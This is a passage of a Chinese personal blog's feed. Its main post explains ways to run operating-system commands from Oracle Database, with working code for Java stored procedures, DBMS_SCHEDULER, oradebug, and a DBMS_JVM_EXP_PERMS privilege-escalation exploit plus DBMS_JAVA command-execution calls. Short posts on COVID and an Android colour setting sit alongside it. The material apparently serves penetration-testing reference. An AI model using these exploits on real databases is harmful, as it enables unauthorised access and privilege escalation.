href="https://blog.chromium.org/2012/04/fuzzing-for-security.html">https://blog.chromium.org/2012/04/fuzzing-for-security.html</a></li><li><a href="https://chromium.googlesource.com/chromium/src/+/lkcr/docs/linux_debugging.md">https://chromium.googlesource.com/chromium/src/+/lkcr/docs/linux_debugging.md</a></li><li><a href="https://web.archive.org/web/20141010035745/http://gnupdf.org/Introduction_to_PDF">https://web.archive.org/web/20141010035745/http://gnupdf.org/Introduction_to_PDF</a></li><li><a href="https://mariomalwareanalysis.blogspot.com/2012/02/how-to-manually-create-pdf.html">https://mariomalwareanalysis.blogspot.com/2012/02/how-to-manually-create-pdf.html</a></li><li><a href="https://mariomalwareanalysis.blogspot.com/2012/02/how-to-embed-javascript-into-pdf.html">https://mariomalwareanalysis.blogspot.com/2012/02/how-to-embed-javascript-into-pdf.html</a></li></ul>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;下载源码&quot;&gt;&lt;a href=&quot;#下载源码&quot; class=&quot;headerlink&quot; title=&quot;下载源码&quot;&gt;&lt;/a&gt;下载源码&lt;/h2&gt;&lt;p&gt;先在 &lt;a href=&quot;https://pdfium.googlesource.com/pdfium/&quot;&gt;https://p</summary>
      
    
    
    
    
    <category term="Security" scheme="http://usmacd.com/tags/Security/"/>
    
  </entry>
  
  <entry>
    <title>一些杂谈</title>
    <link href="http://usmacd.com/cn/other/"/>
    <id>http://usmacd.com/cn/other/</id>
    <published>2023-09-06T03:00:51.729Z</published>
    <updated>2023-09-06T03:00:51.729Z</updated>
    
    <content type="html"><![CDATA[<p>整个春节被武汉的新型冠状病毒肺炎搞得人心惶惶，2020 注定是我们这辈人难忘的一年，非典的时候比较小感觉没那么恐怖，现在的感觉就完全不一样了，整天都在洗手中度过。</p><p>在病情扩散期间，大量消息满天飞，给政府提意见的更是比比皆是，但是大家都忽视了 一点，就是要相信专业。很多人不太明白专业和非专业之间的差距，可以想象一下你和一 个围棋九段的人下围棋，怎么换到医学领域大家就都是专家了？</p><p>我看到一个建议轻征不隔离，把资源让给重症者。</p><p>大家觉得这个建议如何？提这个建议的人说，主要依据是死亡人不多。这个犯了几个错误， 第一，要看死亡率，而不是死亡人数，患病的人多了，自然死人的就多了。第二，根据我 有限的常识，病毒是会自适应性的进化的，感染的人多了，可能就会产生更nb 的变种了。</p><p>这个事情主要还是相信国家，相信我们的祖国。我觉得这个事情一定会解决了，只是时间 和损失程度问题，一季度的gdp 肯定是受影响了，希望疫情快点过去，天佑中华！</p><p>最后希望所有看到此文的，新年幸福安康！</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;整个春节被武汉的新型冠状病毒肺炎搞得人心惶惶，2020 注定是我们这辈人难忘的一年，非典的时候比较小感觉没那么恐怖，现在的感觉就完全不一样了，整天都在洗手中度过。&lt;/p&gt;
&lt;p&gt;在病情扩散期间，大量消息满天飞，给政府提意见的更是比比皆是，但是大家都忽视了 一点，就是要相信专</summary>
      
    
    
    
    
    <category term="Life" scheme="http://usmacd.com/tags/Life/"/>
    
  </entry>
  
  <entry>
    <title>Execute os command in Oracle Database</title>
    <link href="http://usmacd.com/cn/oracle_run_os_cmd/"/>
    <id>http://usmacd.com/cn/oracle_run_os_cmd/</id>
    <published>2023-09-06T03:00:51.727Z</published>
    <updated>2023-09-06T03:00:51.727Z</updated>
    
    <content type="html"><![CDATA[<h2 id="1-正统方法"><a href="#1-正统方法" class="headerlink" title="1. 正统方法"></a>1. 正统方法</h2><h3 id="1-1-使用JAVA"><a href="#1-1-使用JAVA" class="headerlink" title="1.1 使用JAVA"></a>1.1 使用JAVA</h3><h4 id="1-1-1-代码"><a href="#1-1-1-代码" class="headerlink" title="1.1.1 代码"></a>1.1.1 代码</h4><p>Oracle 数据库都支持Java，可以利用java来实现我们需要的功能。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line">CREATE OR REPLACE AND RESOLVE JAVA SOURCE NAMED <span class="string">&quot;JAVACMD&quot;</span> AS</span><br><span class="line"><span class="keyword">import</span> java.lang.*;</span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">JAVACMD</span></span><br><span class="line">&#123;</span><br><span class="line"> <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">execCommand</span> <span class="params">(String command)</span> <span class="keyword">throws</span> IOException</span><br><span class="line"> &#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        String[] finalCommand;</span><br><span class="line">        <span class="keyword">if</span> (System.getProperty(<span class="string">&quot;os.name&quot;</span>).toLowerCase().indexOf(<span class="string">&quot;windows&quot;</span>) != -<span class="number">1</span>) &#123;</span><br><span class="line">            finalCommand = <span class="keyword">new</span> <span class="title class_">String</span>[<span class="number">4</span>];</span><br><span class="line">            finalCommand[<span class="number">0</span>] = <span class="string">&quot;C:\\windows\\system32\\cmd.exe&quot;</span>;</span><br><span class="line">            finalCommand[<span class="number">1</span>] = <span class="string">&quot;/y&quot;</span>;</span><br><span class="line">            finalCommand[<span class="number">2</span>] = <span class="string">&quot;/c&quot;</span>;</span><br><span class="line">            finalCommand[<span class="number">3</span>] = command;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            finalCommand = <span class="keyword">new</span> <span class="title class_">String</span>[<span class="number">3</span>];</span><br><span class="line">            finalCommand[<span class="number">0</span>] = <span class="string">&quot;/bin/sh&quot;</span>;</span><br><span class="line">            finalCommand[<span class="number">1</span>] = <span class="string">&quot;-c&quot;</span>;</span><br><span class="line">            finalCommand[<span class="number">2</span>] = command;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">Process</span> <span class="variable">p</span> <span class="operator">=</span> Runtime.getRuntime().exec(finalCommand);</span><br><span class="line">        <span class="keyword">if</span> (p.waitFor() != <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="keyword">if</span> (p.exitValue() == <span class="number">1</span>)</span><br><span class="line">               System.err.println(<span class="string">&quot;command execute failed.&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">BufferedInputStream</span> <span class="variable">in</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BufferedInputStream</span>(p.getInputStream());</span><br><span class="line">        <span class="type">BufferedReader</span> <span class="variable">inBr</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BufferedReader</span>(<span class="keyword">new</span> <span class="title class_">InputStreamReader</span>(in));</span><br><span class="line">        String lineStr;</span><br><span class="line">        <span class="keyword">while</span> ((lineStr = inBr.readLine()) != <span class="literal">null</span>)</span><br><span class="line">            System.out.println(lineStr);</span><br><span class="line">        inBr.close();</span><br><span class="line">        in.close();</span><br><span class="line">    &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">        e.printStackTrace();</span><br><span class="line">    &#125; </span><br><span class="line"> &#125;</span><br><span class="line">&#125;;</span><br><span class="line">/</span><br><span class="line"></span><br><span class="line">CREATE OR REPLACE PROCEDURE <span class="title function_">JAVACMDPROC</span> <span class="params">(p_command IN VARCHAR2)</span></span><br><span class="line">AS LANGUAGE JAVA</span><br><span class="line">NAME <span class="string">&#x27;JAVACMD.execCommand (java.lang.String)&#x27;</span>;</span><br><span class="line">/</span><br></pre></td></tr></table></figure><h4 id="1-1-2-设置输出"><a href="#1-1-2-设置输出" class="headerlink" title="1.1.2 设置输出"></a>1.1.2 设置输出</h4><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">set</span> serveroutput <span class="keyword">on</span> size <span class="number">100000</span>;</span><br><span class="line"><span class="keyword">exec</span> dbms_java.set_output(<span class="number">100000</span>);</span><br></pre></td></tr></table></figure><h4 id="1-1-3-需要的权限"><a href="#1-1-3-需要的权限" class="headerlink" title="1.1.3 需要的权限"></a>1.1.3 需要的权限</h4><p>可以使用下面的语句查询相关权限</p><ul><li>用户权限</li></ul><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> session_privs;</span><br></pre></td></tr></table></figure><ul><li>JAVA 权限</li></ul><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> dba_java_policy;</span><br><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> user_java_policy;</span><br></pre></td></tr></table></figure><p>使用java代码执行系统命令需要的权限，可以使用下面语句进行授权：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">exec</span> dbms_java.grant_permission(<span class="string">&#x27;SCOTT&#x27;</span>, <span class="string">&#x27;SYS:java.io.FilePermission&#x27;</span>,<span class="string">&#x27;&lt;&lt;ALL FILES&gt;&gt;&#x27;</span>,<span class="string">&#x27;execute&#x27;</span>);</span><br><span class="line"><span class="keyword">exec</span> dbms_java.grant_permission(<span class="string">&#x27;SCOTT&#x27;</span>,<span class="string">&#x27;SYS:java.lang.RuntimePermission&#x27;</span>, <span class="string">&#x27;writeFileDescriptor&#x27;</span>, <span class="string">&#x27;&#x27;</span>);</span><br><span class="line"><span class="keyword">exec</span> dbms_java.grant_permission(<span class="string">&#x27;SCOTT&#x27;</span>,<span class="string">&#x27;SYS:java.lang.RuntimePermission&#x27;</span>, <span class="string">&#x27;readFileDescriptor&#x27;</span>, <span class="string">&#x27;&#x27;</span>);</span><br></pre></td></tr></table></figure><h4 id="1-1-4-实验结果"><a href="#1-1-4-实验结果" class="headerlink" title="1.1.4 实验结果"></a>1.1.4 实验结果</h4><p>非常不错支持回显。</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SQL</span><span class="operator">&gt;</span> <span class="keyword">exec</span> javacmdproc(<span class="string">&#x27;/bin/uname -a&#x27;</span>);</span><br><span class="line">Linux localhost.localdomain <span class="number">2.6</span><span class="number">.32</span><span class="number">-100.34</span><span class="number">.1</span>.el6uek.i686 #<span class="number">1</span> SMP Wed May <span class="number">25</span></span><br><span class="line"><span class="number">17</span>:<span class="number">28</span>:<span class="number">36</span> EDT <span class="number">2011</span> i686 i686 i386 GNU<span class="operator">/</span>Linux</span><br><span class="line"></span><br><span class="line">PL<span class="operator">/</span><span class="keyword">SQL</span> <span class="keyword">procedure</span> successfully completed.</span><br></pre></td></tr></table></figure><h4 id="1-1-5-注意"><a href="#1-1-5-注意" class="headerlink" title="1.1.5 注意"></a>1.1.5 注意</h4><p>需要使用全路径</p><h3 id="1-2-DBMS-SCHEDULAR"><a href="#1-2-DBMS-SCHEDULAR" class="headerlink" title="1.2 DBMS_SCHEDULAR"></a>1.2 DBMS_SCHEDULAR</h3><h4 id="1-2-1-DBMS-SCHEDULAR-简介"><a href="#1-2-1-DBMS-SCHEDULAR-简介" class="headerlink" title="1.2.1 DBMS_SCHEDULAR 简介"></a>1.2.1 DBMS_SCHEDULAR 简介</h4><p>这个和Windows上的计划任务类似。</p><h4 id="1-2-2-需要的权限"><a href="#1-2-2-需要的权限" class="headerlink" title="1.2.2 需要的权限"></a>1.2.2 需要的权限</h4><ol><li>CREATE JOB</li><li>CREATE EXTERNAL JOB</li><li>EXECUTE on dbms_scheduler (granted to public by default)</li></ol><p><code>grant create job, create external job to scott ;</code></p><h4 id="1-2-3-执行的语句"><a href="#1-2-3-执行的语句" class="headerlink" title="1.2.3 执行的语句"></a>1.2.3 执行的语句</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">BEGIN</span><br><span class="line">DBMS_SCHEDULER.CREATE_PROGRAM (</span><br><span class="line">program_name=&gt; <span class="string">&#x27;MyCmd&#x27;</span>,</span><br><span class="line">program_type=&gt; <span class="string">&#x27;EXECUTABLE&#x27;</span>,</span><br><span class="line">-- Use the ampersand to <span class="keyword">break</span> <span class="type">out</span></span><br><span class="line"><span class="variable">program_action</span> <span class="operator">=</span>&gt; <span class="string">&#x27;/tmp/a.sh&#x27;</span>,</span><br><span class="line">enabled=&gt; TRUE,</span><br><span class="line">comments=&gt; <span class="string">&#x27;Run a command using shell metacharacters.&#x27;</span></span><br><span class="line"> );</span><br><span class="line">END;</span><br><span class="line">/</span><br><span class="line"></span><br><span class="line">BEGIN</span><br><span class="line">DBMS_SCHEDULER.CREATE_JOB (</span><br><span class="line">   job_name=&gt; <span class="string">&#x27;X&#x27;</span>,</span><br><span class="line">   program_name=&gt; <span class="string">&#x27;MyCmd&#x27;</span>,</span><br><span class="line">   repeat_interval=&gt; <span class="string">&#x27;FREQ=SECONDLY;INTERVAL=10&#x27;</span>,</span><br><span class="line">   enabled=&gt; TRUE,</span><br><span class="line">   comments=&gt; <span class="string">&#x27;Every 10 seconds&#x27;</span>);</span><br><span class="line">END;</span><br><span class="line">/</span><br><span class="line"></span><br><span class="line">exec DBMS_SCHEDULER.RUN_JOB ( job_name=&gt; <span class="string">&#x27;X&#x27;</span>);</span><br></pre></td></tr></table></figure><h4 id="1-2-4-注意"><a href="#1-2-4-注意" class="headerlink" title="1.2.4 注意"></a>1.2.4 注意</h4><ol><li>原先使用 || 等 metacharacters 的bug已经修复，只能使用参数</li><li>Windows系统必须开启OracleJobSchedulerSID 服务</li><li>Linux系统上相关文件的权限必须正确</li><li>高版本的Linux，执行的group已经被Oracle将为nobody</li></ol><p>总之这个方法局限行很大，不推荐使用，列在这里只是做一个备忘。</p><h3 id="1-3-使用oradebug"><a href="#1-3-使用oradebug" class="headerlink" title="1.3 使用oradebug"></a>1.3 使用oradebug</h3><ul><li>oradebug 简介<br>oradebug是一个神奇的命令, 能干很多活, 但是Oracle却很少提及，属于undocumented<br>状态，是给oracle的工程师使用的，主要用于调试和性能调优。可以使用 oradebug help<br>命令，查看oradebug的用法</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line">SQL&gt; oradebug help</span><br><span class="line">HELP           [command]                 Describe one or all commands</span><br><span class="line">SETMYPID                                 Debug current process</span><br><span class="line">SETOSPID       &lt;ospid&gt;                   Set OS pid of process to debug</span><br><span class="line">SETORAPID      &lt;orapid&gt; [&#x27;force&#x27;]        Set Oracle pid of process to debug</span><br><span class="line">SETORAPNAME    &lt;orapname&gt;                Set Oracle process name to debug</span><br><span class="line">SHORT_STACK                              Get abridged OS stack</span><br><span class="line">CURRENT_SQL                              Get current SQL</span><br><span class="line">DUMP           &lt;dump_name&gt; &lt;lvl&gt; [addr]  Invoke named dump</span><br><span class="line">DUMPSGA        [bytes]                   Dump fixed SGA</span><br><span class="line">DUMPLIST                                 Print a list of available dumps</span><br><span class="line">EVENT          &lt;text&gt;                    Set trace event in process</span><br><span class="line">SESSION_EVENT  &lt;text&gt;                    Set trace event in session</span><br><span class="line">DUMPVAR        &lt;p|s|uga&gt; &lt;name&gt; [level]  Print/dump a fixed PGA/SGA/UGA variable</span><br><span class="line">DUMPTYPE       &lt;address&gt; &lt;type&gt; &lt;count&gt;  Print/dump an address with type info</span><br><span class="line">SETVAR         &lt;p|s|uga&gt; &lt;name&gt; &lt;value&gt;  Modify a fixed PGA/SGA/UGA variable</span><br><span class="line">PEEK           &lt;addr&gt; &lt;len&gt; [level]      Print/Dump memory</span><br><span class="line">POKE           &lt;addr&gt; &lt;len&gt; &lt;value&gt;      Modify memory</span><br><span class="line">WAKEUP         &lt;orapid&gt;                  Wake up Oracle process</span><br><span class="line">SUSPEND                                  Suspend execution</span><br><span class="line">RESUME                                   Resume execution</span><br><span class="line">FLUSH                                    Flush pending writes to trace file</span><br><span class="line">CLOSE_TRACE                              Close trace file</span><br><span class="line">TRACEFILE_NAME                           Get name of trace file</span><br><span class="line">LKDEBUG                                  Invoke global enqueue service debugger</span><br><span class="line">NSDBX                                    Invoke CGS name-service debugger</span><br><span class="line">-G             &lt;Inst-List | def | all&gt;   Parallel oradebug command prefix</span><br><span class="line">-R             &lt;Inst-List | def | all&gt;   Parallel oradebug prefix (return output</span><br><span class="line">SETINST        &lt;instance# .. | all&gt;      Set instance list in double quotes</span><br><span class="line">SGATOFILE      &lt;SGA dump dir&gt;         Dump SGA to file; dirname in double quotes</span><br><span class="line">DMPCOWSGA      &lt;SGA dump dir&gt; Dump &amp; map SGA as COW; dirname in double quotes</span><br><span class="line">MAPCOWSGA      &lt;SGA dump dir&gt;         Map SGA as COW; dirname in double quotes</span><br><span class="line">HANGANALYZE    [level] [syslevel]        Analyze system hang</span><br><span class="line">FFBEGIN                                  Flash Freeze the Instance</span><br><span class="line">FFDEREGISTER                             FF deregister instance from cluster</span><br><span class="line">FFTERMINST                               Call exit and terminate instance</span><br><span class="line">FFRESUMEINST                             Resume the flash frozen instance</span><br><span class="line">FFSTATUS                                 Flash freeze status of instance</span><br><span class="line">SKDSTTPCS      &lt;ifname&gt;  &lt;ofname&gt;        Helps translate PCs to names</span><br><span class="line">WATCH          &lt;address&gt; &lt;len&gt; &lt;self|exist|all|target&gt;  Watch a region of memory</span><br><span class="line">DELETE         &lt;local|global|target&gt; watchpoint &lt;id&gt;    Delete a watchpoint</span><br><span class="line">SHOW           &lt;local|global|target&gt; watchpoints        Show  watchpoints</span><br><span class="line">DIRECT_ACCESS  &lt;set/enable/disable command | select query&gt; Fixed table access</span><br><span class="line">CORE                                     Dump core without crashing process</span><br><span class="line">IPC                                      Dump ipc information</span><br><span class="line">UNLIMIT                                  Unlimit the size of the trace file</span><br><span class="line">PROCSTAT                                 Dump process statistics</span><br><span class="line">CALL           [-t count] &lt;func&gt; [arg1]...[argn]  Invoke function with arguments</span><br></pre></td></tr></table></figure><p>功能非常丰富， 下面我们用到的是 CALL 可以直接调用oracle进程使用的函数。</p><h4 id="执行的语句"><a href="#执行的语句" class="headerlink" title="执行的语句"></a>执行的语句</h4><p><code>oradebug setmypid; oradebug call system &quot;/usr/bin/whoami      &gt;/tmp/ret&quot;;</code></p><h4 id="注意"><a href="#注意" class="headerlink" title="注意"></a>注意</h4><ol><li>这里权限要求是SYSDBA</li><li>双引号里必须是使用TAB而不能使用空格</li><li>Linux 和 Windows 下的ORACLE都能利用成功</li></ol><h2 id="2-黑客方法"><a href="#2-黑客方法" class="headerlink" title="2. 黑客方法"></a>2. 黑客方法</h2><p>下面用到的两个方法是David Litchfield 在Blackhat DC 2010 上公开两个方法,通过逆向<br>发现。结合DBMS_JVM_EXP_PERMS的漏洞可以直接执行系统命令(DBMS_JVM_EXP_PERMS 漏洞<br>已经被被修复)</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">DECLARE</span><br><span class="line">POL DBMS_JVM_EXP_PERMS.TEMP_JAVA_POLICY;</span><br><span class="line">CURSOR C1 IS SELECT ‘GRANT’,USER(), ‘SYS’,<span class="string">&#x27;java.io.FilePermission’,’&lt;&lt;ALL FILES&gt;&gt;‘,’execute’,&#x27;</span>ENABLED’ from dual;</span><br><span class="line">BEGIN</span><br><span class="line">OPEN C1;</span><br><span class="line">FETCH C1 BULK COLLECT INTO POL;</span><br><span class="line">CLOSE C1;</span><br><span class="line">DBMS_JVM_EXP_PERMS.IMPORT_JVM_PERMS(POL);</span><br><span class="line">END;</span><br><span class="line">/</span><br></pre></td></tr></table></figure><p>在有漏洞的DBMS_JVM_EXP_PERMS package的Oracle上执行上述语句，有create session<br>权限的用户可以给自己授权所有java 权限。</p><h3 id="2-1-DBMS-JAVA-TEST-FUNCALL"><a href="#2-1-DBMS-JAVA-TEST-FUNCALL" class="headerlink" title="2.1 DBMS_JAVA_TEST.FUNCALL"></a>2.1 DBMS_JAVA_TEST.FUNCALL</h3><h4 id="2-1-1-执行的语句"><a href="#2-1-1-执行的语句" class="headerlink" title="2.1.1 执行的语句"></a>2.1.1 执行的语句</h4><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">Select</span> DBMS_JAVA_TEST.FUNCALL(<span class="string">&#x27;oracle/aurora/util/Wrapper&#x27;</span>,<span class="string">&#x27;main&#x27;</span>,<span class="string">&#x27;/bin/bash&#x27;</span>,<span class="string">&#x27;-c&#x27;</span>,<span class="string">&#x27;/bin/ls&gt;/tmp/OUT2.LST&#x27;</span>) <span class="keyword">from</span> dual;</span><br></pre></td></tr></table></figure><h4 id="2-1-2-需要的权限"><a href="#2-1-2-需要的权限" class="headerlink" title="2.1.2 需要的权限"></a>2.1.2 需要的权限</h4><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">exec</span> dbms_java.grant_permission(<span class="string">&#x27;SCOTT&#x27;</span>, <span class="string">&#x27;SYS:java.io.FilePermission&#x27;</span>,<span class="string">&#x27;&lt;&lt;ALL FILES&gt;&gt;&#x27;</span>,<span class="string">&#x27;execute&#x27;</span>);</span><br></pre></td></tr></table></figure><h4 id="2-1-3-受影响系统"><a href="#2-1-3-受影响系统" class="headerlink" title="2.1.3 受影响系统"></a>2.1.3 受影响系统</h4><p>11g R1, 11g R2</p><h3 id="2-2-DBMS-JAVA-RUNJAVA"><a href="#2-2-DBMS-JAVA-RUNJAVA" class="headerlink" title="2.2 DBMS_JAVA.RUNJAVA"></a>2.2 DBMS_JAVA.RUNJAVA</h3><h4 id="2-2-1-执行的语句"><a href="#2-2-1-执行的语句" class="headerlink" title="2.2.1 执行的语句"></a>2.2.1 执行的语句</h4><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> DBMS_JAVA.RUNJAVA(<span class="string">&#x27;oracle/aurora/util/Wrapper /bin/bash -c /bin/ls&gt;/tmp/OUT.LST&#x27;</span>) <span class="keyword">FROM</span> DUAL;</span><br></pre></td></tr></table></figure><h4 id="2-2-2-需要的权限"><a href="#2-2-2-需要的权限" class="headerlink" title="2.2.2 需要的权限"></a>2.2.2 需要的权限</h4><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">exec</span> dbms_java.grant_permission(<span class="string">&#x27;SCOTT&#x27;</span>, <span class="string">&#x27;SYS:java.io.FilePermission&#x27;</span>,<span class="string">&#x27;&lt;&lt;ALL FILES&gt;&gt;&#x27;</span>,<span class="string">&#x27;execute&#x27;</span>);</span><br></pre></td></tr></table></figure><h4 id="2-2-3-受影响系统"><a href="#2-2-3-受影响系统" class="headerlink" title="2.2.3 受影响系统"></a>2.2.3 受影响系统</h4><p>10g R2, 11g R1, 11g R2</p><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><ol><li><a href="http://www.orafaq.com/scripts/plsql/oscmd.txt">Using Java to run os command</a></li><li><a href="http://docs.oracle.com/cd/B28359_01/server.111/b28310/scheduse002.htm#CHDIDGAE">DBMS_SCHEDULER</a></li><li><a href="http://www.juliandyke.com/Diagnostics/Tools/ORADEBUG/ORADEBUG.html">oradebug</a></li><li><a href="">BlackHat-DC-2010-Litchfield-Oracle11g</a></li><li><a href="http://media.blackhat.com/bh-us-10/whitepapers/Siddharth/BlackHat-USA-2010-Siddharth-Hacking-Oracle-from-the-Web-wp.pdf">Hacking Oracle from the Web</a></li></ol>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;1-正统方法&quot;&gt;&lt;a href=&quot;#1-正统方法&quot; class=&quot;headerlink&quot; title=&quot;1. 正统方法&quot;&gt;&lt;/a&gt;1. 正统方法&lt;/h2&gt;&lt;h3 id=&quot;1-1-使用JAVA&quot;&gt;&lt;a href=&quot;#1-1-使用JAVA&quot; class=&quot;header</summary>
      
    
    
    
    
    <category term="Security" scheme="http://usmacd.com/tags/Security/"/>
    
  </entry>
  
  <entry>
    <title>一加 (oneplus ) 3T 非root 开启 P3 色域</title>
    <link href="http://usmacd.com/cn/oneplus3T_p3/"/>
    <id>http://usmacd.com/cn/oneplus3T_p3/</id>
    <published>2023-09-06T03:00:51.725Z</published>
    <updated>2023-09-06T03:00:51.725Z</updated>
    
    <content type="html"><![CDATA[<p>一加3T其实和一加5用的是同一块屏幕，网上流传的方法多需要root权限。非root 开启 p3 色域的方法，<br>连接 adb 输入下面的命令 <code>settings put system screen_color_mode_settings_value 4</code> 实测有效，重启后不失效。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;一加3T其实和一加5用的是同一块屏幕，网上流传的方法多需要root权限。非root 开启 p3 色域的方法，&lt;br&gt;连接 adb 输入下面的命令 &lt;code&gt;settings put system screen_color_mode_settings_value 4&lt;/co</summary>
      
    
    
    
    
    <category term="Life" scheme="http://usmacd.com/tags/Life/"/>
    
  </entry>
  
</feed>
